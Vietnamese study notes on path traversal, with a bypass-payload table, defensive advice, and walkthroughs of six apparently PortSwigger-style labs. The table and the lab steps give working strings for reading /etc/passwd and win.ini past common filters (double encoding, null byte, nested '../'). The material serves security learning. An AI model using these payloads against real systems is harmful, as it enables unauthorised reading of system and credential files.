# PATH TRAVERSAL — KIẾN THỨC TỔNG HỢP & STEP BY STEP

## Mục lục
1. [Path traversal là gì?](#1-path-traversal-là-gì)
2. [Payload cơ bản & bypass filter](#2-payload-cơ-bản--bypass-filter)
3. [Cách phòng chống](#3-cách-phòng-chống)
4. [Lab step-by-step](#4-lab-step-by-step)

## 1. Path traversal là gì?

Còn gọi là "directory traversal", cho phép attacker đọc (hoặc trong 1 số trường hợp ghi) file tuỳ ý trên server bằng cách thao túng đường dẫn file trong tham số ứng dụng dùng để load resource (ảnh, tài liệu...), sử dụng chuỗi `../` để "thoát" khỏi thư mục dự kiến.

```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

## 2. Payload cơ bản & bypass filter

| Kỹ thuật chặn | Cách bypass |
|---|---|
| Không lọc gì | `../../../etc/passwd` |
| Chặn chuỗi `../` (xoá 1 lần, không đệ quy) | `....//....//....//etc/passwd` (sau khi xoá `../` 1 lần vẫn còn dư `../`) |
| Yêu cầu path bắt đầu bằng thư mục cố định | `/var/www/images/../../../etc/passwd` (dùng absolute path hợp lệ ban đầu rồi traversal ra ngoài) |
| Yêu cầu path kết thúc bằng đuôi file cụ thể (`.png`) | `../../../etc/passwd%00.png` (null byte truncation — chỉ hiệu quả trên hệ thống cũ/ngôn ngữ không được vá), hoặc dùng path chứa null byte tương đương |
| URL-encode 1 lớp bị chặn | Dùng double URL-encoding: `..%252f..%252f..%252fetc%252fpasswd` (`%25`=`%`, decode 2 lần thành `../`) |
| Chặn `../` nhưng không chặn biến thể encode khác | `..%2f..%2f..%2fetc%2fpasswd`, hoặc ký tự Unicode overlong encoding tương đương `/` |
| Validate bắt đầu bằng thư mục con hợp lệ | Thêm path hợp lệ ở đầu rồi traversal: `images/../../../etc/passwd` |

## 3. Cách phòng chống

- Tránh hoàn toàn việc dùng input người dùng để xây dựng đường dẫn file trực tiếp — dùng ID tra cứu (index/mapping) tới đường dẫn cố định phía server thay vì nhận filename từ client.
- Nếu bắt buộc, validate bằng cách: resolve đường dẫn tuyệt đối (canonicalize) rồi kiểm tra nó có nằm trong thư mục cho phép hay không (dùng API chuẩn của ngôn ngữ, ví dụ `realpath()`/`Path.normalize()`, không tự viết regex).
- Whitelist tên file/extension cho phép, không dùng blacklist.
- Chạy ứng dụng với quyền hạn tối thiểu, giới hạn quyền đọc file hệ thống.

## 4. Lab step-by-step

### Lab 1: File path traversal, simple case
**Mục tiêu:** Đọc `/etc/passwd` qua chức năng xem ảnh sản phẩm.
- **B1:** Vào trang sản phẩm, quan sát request tải ảnh: `GET /image?filename=58.jpg`.
- **B2:** Sửa `filename=../../../etc/passwd`.
- **B3:** Response trả về nội dung file `/etc/passwd` → lab solved.

### Lab 2: File path traversal, traversal sequences blocked with absolute path bypass
**Mục tiêu:** Filter chặn `../` nhưng chấp nhận absolute path.
- **B1:** Thử `../../../etc/passwd` → bị chặn.
- **B2:** Thử absolute path trực tiếp: `filename=/etc/passwd`.
- **B3:** Server không chặn absolute path (chỉ chặn chuỗi `../`) → đọc được file → lab solved.

### Lab 3: File path traversal, traversal sequences stripped non-recursively
**Mục tiêu:** Filter chỉ xoá `../` 1 lần (không đệ quy).
- **B1:** Thử `../../../etc/passwd` → bị strip hết thành rỗng/lỗi.
- **B2:** Dùng chuỗi lồng: `....//....//....//etc/passwd` — sau khi server xoá `../` (khớp giữa `....//`), phần còn lại tự ghép thành `../`.
- **B3:** Đọc được `/etc/passwd` → lab solved.

### Lab 4: File path traversal, traversal sequences stripped with superfluous URL-decode
**Mục tiêu:** Server decode URL 2 lần — dùng double-encoding để bypass filter chặn `../` (filter kiểm tra trước khi decode lần 2).
- **B1:** Thử `../../../etc/passwd` và `..%2f..%2f..%2fetc%2fpasswd` → đều bị chặn (filter nhận diện được sau decode lần 1).
- **B2:** Dùng double URL-encode: `..%252f..%252f..%252fetc%252fpasswd` (`%25`→`%` sau decode lần 1, filter check không thấy `../` vì lúc đó vẫn là `%2f`; nhưng sau decode lần 2 mới thành `../` thật khi dùng để mở file).
- **B3:** Đọc được `/etc/passwd` → lab solved.

### Lab 5: File path traversal, validation of start of path
**Mục tiêu:** Server chỉ validate path phải **bắt đầu** bằng thư mục cố định (`/var/www/images/`).
- **B1:** Thử `../../../etc/passwd` → bị chặn do không bắt đầu đúng prefix yêu cầu.
- **B2:** Thêm prefix hợp lệ vào đầu rồi traversal ra ngoài:
  ```
  filename=/var/www/images/../../../etc/passwd
  ```
- **B3:** Server chỉ check `startsWith('/var/www/images/')` (đúng) mà không canonicalize lại → đọc được `/etc/passwd` → lab solved.

### Lab 6: File path traversal, validation of file extension with null byte bypass
**Mục tiêu:** Server yêu cầu path kết thúc bằng `.png` — bypass bằng null byte.
- **B1:** Thử `../../../etc/passwd` → bị chặn do không kết thúc bằng `.png`.
- **B2:** Thêm null byte (`%00`) trước phần đuôi giả để "cắt" chuỗi khi xử lý filesystem, trong khi phần check đuôi vẫn thấy `.png` ở cuối chuỗi ban đầu:
  ```
  filename=../../../etc/passwd%00.png
  ```
- **B3:** Server validate thấy chuỗi kết thúc bằng `.png` (hợp lệ), nhưng khi mở file thực tế, hệ thống dừng đọc tên file tại byte `%00` → mở đúng `/etc/passwd` → đọc được nội dung → lab solved.

## Tổng kết
- Luôn thử payload cơ bản trước (`../../../etc/passwd`), sau đó lần lượt thử các biến thể bypass: absolute path, non-recursive strip, double-encode, prefix validation bypass, null byte.
- File mục tiêu phổ biến để xác nhận PoC trên Linux: `/etc/passwd`; trên Windows: `C:\Windows\win.ini`.

